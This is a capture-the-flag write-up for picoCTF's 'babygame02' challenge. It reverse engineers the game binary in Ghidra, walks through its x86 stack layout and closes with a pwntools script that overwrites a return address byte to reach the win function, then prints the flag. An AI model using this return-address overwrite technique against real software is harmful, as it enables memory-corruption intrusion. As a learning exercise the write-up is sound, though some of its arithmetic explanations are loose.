# babygame02

## Method

```
Break the game and get the flag.
Welcome to BabyGame 02! Navigate around the map and see what you can find! The game is available to download here.
There is no source available, so you'll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 59056.
```
**Hint1:** Use 'w','a','s','d' to move around. There may be secret commands to make your life easy.


Similar challenge as to babygame01 grid like structure moving to the final location for the flag but not recieving it.

I shoved it into ghidra like before to see how I could solve it. 

```c
undefined4 main(void)

{
  int iVar1;
  int local_aa8;
  int local_aa4;
  undefined local_a9d [2700];
  char local_11;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&local_aa8);
  init_map(local_a9d,&local_aa8);
  print_map(local_a9d,&local_aa8);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      local_11 = (char)iVar1;
      move_player(&local_aa8,(int)local_11,local_a9d);
      print_map(local_a9d,&local_aa8);
    } while (local_aa8 != 0x1d);
  } while (local_aa4 != 0x59);
  puts("You win!");
  return 0;
}

```
Glancing at the c function its similar but with 1 glaring issue. We do not have the supposed Test condition for printing the flag.

However it seems the initilizations etc are still the same.
Looking again at the functions like ``init_player`` and ``init_map`` we realise its similar even move_player. they have provided the same function meaning it wraps around successfully and also has a solve round button. We also see a function to change the player's title

investigating all functions we can't really seem to find a way to get the flag printed, so how about we start looking at the assembly?

This looks similar to my rev challenges with assembly.
We can first start looking at main.

---

**Note:**

As discussed before in babygame01 we know memory here is used in the form of a stack where it grows 'downwards' in the memory meaning address decreases as we add more things. Each function has it's own stack frame.

For this stack we have two things ESP (Stack Pointer) and EBP (Base Pointer)

1. ESP (register) the stack pointer points to the top of the stack or the most recently entered value.

2. EBP(register) Serves as a fixed reference point for the current Stack being used.

We also have general purpose registers liek EAX, EBX etc...

---

Looking at the start of main we see some things

```asm
                             *************************************************************
                             *                           FUNCTION                         
                             *************************************************************
                             undefined  main (undefined1  param_1 )
             undefined         AL:1           <RETURN>
             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     08049674 (*)   
             undefined4        Stack[0x0]:4   local_res0                              XREF[2]:     0804967b (R) , 
                                                                                                   08049759 (*)   
             undefined1        Stack[-0x10]   local_10                                XREF[1]:     08049753 (*)   
             undefined1        Stack[-0x11]   local_11                                XREF[2]:     080496eb (W) , 
                                                                                                   080496ee (R)   
             undefined1        Stack[-0xa9d...local_a9d                               XREF[4]:     080496aa (*) , 
                                                                                                   080496c3 (*) , 
                                                                                                   080496f5 (*) , 
                                                                                                   08049716 (*)   
             undefined4        Stack[-0xaa4...local_aa4                               XREF[1]:     08049730 (R)   
             undefined4        Stack[-0xaa8...local_aa8                               XREF[6]:     08049694 (*) , 
                                                                                                   080496a3 (*) , 
                                                                                                   080496bc (*) , 
                                                                                                   080496fd (*) , 
                                                                                                   0804970f (*) , 
                                                                                                   08049725 (R)
                             main                                            XREF[5]:     Entry Point (*) , 
                                                                                          _start:08049110 (*) , 
                                                                                          _start:08049116 (*) ,  0804a0e8 , 
                                                                                          0804a2a8 (*)                                                                                                                      
```
From here we can tell the first part is just the signature of what it is and after is the declaration of the function main
From here we see the first delcaration is just a return type variable.

After that however we some declarations referencing our stack frame in the form *Stack[x]:y*. What this essentially means is that x is the offset from the stack pointer essentially the distance from EBP or the ESP and the y is the number of bytes or size ofthe variable. Then ofcourse we have the variable name. 

We also see at the end of it the use of *XREF[x]* where x is the number of times it is referenced in the programme and a string right after it. The string after it is the address where its being accessed and the (z) the z value if R or W is read or write and the * is direct access or usage. 

We also see references of variables like ``Stack[-0xa9d...variablename`` These are variables within the stack frame and are accessed using offsets relative to EBP, Negative offsets (-x) for local variables allocated within the function. Positive offsets (+x) for parameters passed to the function. The value 0xa9d references the decimal bytes below the the EBP. Once all these.

The empty lines with address values and the (*) operation typically represent unused or uninitialized stack space

After all of this at the end of it we see main which we can assume this is the start of execution where we then have the entry point to main and 2 specific memory addresses where the main function is referenced or called. The _start probably references it to start the process.

This all is essentially done to setup the stack frame for the function main

Now looking at the rest of main it looks like a mess.

However we can understand it in this term

`` address opcodes(operations) operation function ``

*Note:*

- LEA = Load Effective Address (calculates new address loading it in a register)
- PUSH = pushes a new value onto the stack
- Mov = transfers data from one location to another

```asm
        08049674 8d  4c  24       LEA        ECX => param_1 ,[ESP  + 0x4 ]
                 04
        08049678 83  e4  f0       AND        ESP ,0xfffffff0
        0804967b ff  71  fc       PUSH       dword ptr [ECX  + local_res0 ]
        0804967e 55              PUSH       EBP
        0804967f 89  e5           MOV        EBP ,ESP
        08049681 53              PUSH       EBX
        08049682 51              PUSH       ECX
        08049683 81  ec  a0       SUB        ESP ,0xaa0
                 0a  00  00
        08049689 e8  b2  fa       CALL       __x86.get_pc_thunk.bx                            undefined __x86.get_pc_thunk.bx(
                 ff  ff
        0804968e 81  c3  72       ADD        EBX ,0x2972
                 29  00  00
        08049694 8d  85  60       LEA        EAX => local_aa8 ,[EBP  + 0xfffff560 ]
                 f5  ff  ff
        0804969a 50              PUSH       EAX
        0804969b e8  b1  fd       CALL       init_player                                      undefined init_player(undefined4
                 ff  ff
        080496a0 83  c4  04       ADD        ESP ,0x4
        080496a3 8d  85  60       LEA        EAX => local_aa8 ,[EBP  + 0xfffff560 ]
                 f5  ff  ff
        080496a9 50              PUSH       EAX
        080496aa 8d  85  6b       LEA        EAX => local_a9d ,[EBP  + 0xfffff56b ]
                 f5  ff  ff
        080496b0 50              PUSH       EAX
        080496b1 e8  6d  fb       CALL       init_map                                         undefined init_map(undefined4 pa
                 ff  ff
        080496b6 83  c4  08       ADD        ESP ,0x8
        080496b9 83  ec  08       SUB        ESP ,0x8
        080496bc 8d  85  60       LEA        EAX => local_aa8 ,[EBP  + 0xfffff560 ]
                 f5  ff  ff
        080496c2 50              PUSH       EAX
        080496c3 8d  85  6b       LEA        EAX => local_a9d ,[EBP  + 0xfffff56b ]
                 f5  ff  ff
        080496c9 50              PUSH       EAX
        080496ca e8  e0  fc       CALL       print_map                                        undefined print_map(undefined4 p
                 ff  ff
        080496cf 83  c4  10       ADD        ESP ,0x10
        080496d2 83  ec  08       SUB        ESP ,0x8
        080496d5 8d  83  06       LEA        EAX ,[EBX  + 0xffffd206 ]=> sigint_handler
                 d2  ff  ff
        080496db 50              PUSH       EAX => sigint_handler
        080496dc 6a  02           PUSH       0x2
        080496de e8  ad  f9       CALL       <EXTERNAL>::signal                               __sighandler_t signal(int __sig,
                 ff  ff
        080496e3 83  c4  10       ADD        ESP ,0x10
                             LAB_080496e6                                    XREF[2]:     0804972e (j) ,  08049739 (j)   
        080496e6 e8  85  f9       CALL       <EXTERNAL>::getchar                              int getchar(void)
                 ff  ff
        080496eb 88  45  f7       MOV        byte ptr [EBP  + local_11 ],AL
        080496ee 0f  be  45       MOVSX      EAX ,byte ptr [EBP  + local_11 ]
                 f7
        080496f2 83  ec  04       SUB        ESP ,0x4
        080496f5 8d  95  6b       LEA        EDX => local_a9d ,[EBP  + 0xfffff56b ]
                 f5  ff  ff
        080496fb 52              PUSH       EDX
        080496fc 50              PUSH       EAX
        080496fd 8d  85  60       LEA        EAX => local_aa8 ,[EBP  + 0xfffff560 ]
                 f5  ff  ff
        08049703 50              PUSH       EAX
        08049704 e8  6b  fd       CALL       move_player                                      undefined move_player(undefined4
                 ff  ff
        08049709 83  c4  10       ADD        ESP ,0x10
        0804970c 83  ec  08       SUB        ESP ,0x8
        0804970f 8d  85  60       LEA        EAX => local_aa8 ,[EBP  + 0xfffff560 ]
                 f5  ff  ff
        08049715 50              PUSH       EAX
        08049716 8d  85  6b       LEA        EAX => local_a9d ,[EBP  + 0xfffff56b ]
                 f5  ff  ff
        0804971c 50              PUSH       EAX
        0804971d e8  8d  fc       CALL       print_map                                        undefined print_map(undefined4 p
                 ff  ff
        08049722 83  c4  10       ADD        ESP ,0x10
        08049725 8b  85  60       MOV        EAX ,dword ptr [EBP  + local_aa8 ]
                 f5  ff  ff
        0804972b 83  f8  1d       CMP        EAX ,0x1d
        0804972e 75  b6           JNZ        LAB_080496e6
        08049730 8b  85  64       MOV        EAX ,dword ptr [EBP  + local_aa4 ]
                 f5  ff  ff
        08049736 83  f8  59       CMP        EAX ,0x59
        08049739 75  ab           JNZ        LAB_080496e6
        0804973b 83  ec  0c       SUB        ESP ,0xc
        0804973e 8d  83  3f       LEA        EAX ,[EBX  + 0xffffe03f ]=> s_You_win!_0804a03f     = "You win!"
                 e0  ff  ff
        08049744 50              PUSH       EAX => s_You_win!_0804a03f                        = "You win!"
        08049745 e8  66  f9       CALL       <EXTERNAL>::puts                                 int puts(char * __s)
                 ff  ff
        0804974a 83  c4  10       ADD        ESP ,0x10
        0804974d 90              NOP
        0804974e b8  00  00       MOV        EAX ,0x0
                 00  00
        08049753 8d  65  f8       LEA        ESP => local_10 ,[EBP  + -0x8 ]
        08049756 59              POP        ECX
        08049757 5b              POP        EBX
        08049758 5d              POP        EBP
        08049759 8d  61  fc       LEA        ESP => local_res0 ,[ECX  + -0x4 ]
        0804975c c3              RET

```

We also manage to see a glimpse of the win function 

![image](https://github.com/user-attachments/assets/1a18a1dc-73c7-452f-855b-312ed4555663)

Now looking at the first part 

```asm
08049674 8d  4c  24       LEA        ECX => param_1 ,[ESP  + 0x4 ]
         04
08049678 83  e4  f0       AND        ESP ,0xfffffff0
0804967b ff  71  fc       PUSH       dword ptr [ECX  + local_res0 ]
0804967e 55              PUSH       EBP
0804967f 89  e5           MOV        EBP ,ESP
08049681 53              PUSH       EBX
08049682 51              PUSH       ECX
```

we can just understand that these are just initalising the starting pointers from the EBP and ESP, but essentially we Know ESP holds the value of EBP and the other 2 statements after that initialize registers.

The intresting part comes after this which is ``08049683 81  ec  a0       SUB        ESP ,0xaa0`` This essentially moves our current pointer or "top" of the stack in dsa terms 0xaa0 downfrom it which is 2720 bytes after conversion

We then 3 functions in use to initialize the player then the map and finally print it. We have another function ``signal`` which adds 0x10 which is 10 to the ESP. We then enter the loops as seen to which we can then start working  with what is happening in the loops to which we see something interesting happening to some of the pointers before mov_player is activated.

```asm
080496eb 88  45  f7       MOV        byte ptr [EBP  + local_11 ],AL
080496ee 0f  be  45       MOVSX      EAX ,byte ptr [EBP  + local_11 ]
         f7
080496f2 83  ec  04       SUB        ESP ,0x4
080496f5 8d  95  6b       LEA        EDX => local_a9d ,[EBP  + 0xfffff56b ]
         f5  ff  ff
080496fb 52              PUSH       EDX
080496fc 50              PUSH       EAX
080496fd 8d  85  60       LEA        EAX => local_aa8 ,[EBP  + 0xfffff560 ]
         f5  ff  ff
08049703 50              PUSH       EAX
08049704 e8  6b  fd       CALL       move_player                                      undefined move_player(undefined4
         ff  ff
08049709 83  c4  10       ADD        ESP ,0x10
```

![image](https://github.com/user-attachments/assets/97305b2c-951f-40a9-afb0-bbc047d92db1)


the 2 statements first help set the local_11 variable
However after that are some statements that are executed before the start of move_player.

These first subtract 4 more from ESP, then we push the value of address of local_a9d which has the offset of EBP + 0xfffff56b (negative offset) into EDX where EBP was the starting of the stack frame and 0xfffff56b is -2709 in signed decimal. then we Push the value of EAX onto the stack then proceed to load EAX with a new value which is -2720 from the EBP. Now lastly we are doing a call which essentially returns the address of the function value which in this case is the next address value which in this case is ``08049709``.


**Solving part ->**
Considering the previous game we can traverse acrossss the memory byte by byte And we can change one byte anywhere in the stack with the name of the player as shown before. So we should go about changing the return address to the win function's address of print as it would be unreachable otherwise. We first need to find the number of bytes from the start of the Array to the return address once we reach the return address with our player our player should contain the correct ascii value to possibly overflow us to the win function

From this we can understand a certain bytes workflow of 

EBP 
EBX
ECX
^
|
| 2720 Bytes
v
sub 4
param EDX (EBP - 2709)
param EAX
param local_aa8
return address (08049709)

From here we start calculating the number of bytes for each statement

4 x 3 for the first 3

We consider 4 btytes for the sub 4

Then we have to consider the fact that we move 2709 back up which is 11 bits from the already moved 2720

We can then consider 4 x 3 for the last 3 statements for the return address

Adding all of this we get 39 bytes.

Now that we know how to traverse to the address of the return function we now need to know how to buffer our way to the win function. In this function the line that prints the flag seems to have an address that starts with 08049783, Now finding the value to change the last 2 variables from the address of 09 to 83 is ``t`` as the hexadecimal value of 74 (difference of 83 -09 = 74) so we have to enter ``t`` as our character name.

Ok so first I tried moving to the top left using 4 as and 4 ws. Once done i tried moving left 39 times with 39 as.
However after about 4 movements left the program crashed with SIGSEGV (segmentation fault). To which i can assume i had overwritten something important hence why it had crashed.
So i retried by moving again one up with 5ws and 4as What this essentially does is instantly move us 90 bytes as 1 row is 90 bytes :) (taken help online)
I then proceeded to change the name of the player

Now from here i enter 39 bytes to which I then. After this accounting for the fact that i had to move up an extra once to avoid a fault i can then move down once. Which then returns my flag :D


```python
from pwn import *

p = remote("saturn.picoctf.net", 59056)

p.sendline("aaaawwwww")
p.sendline("lt")
p.sendline("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
p.sendline("s")

p.interactive()
```

## Flag

> picoCTF{gamer_jump1ng_4r0unD_227ec6b0}
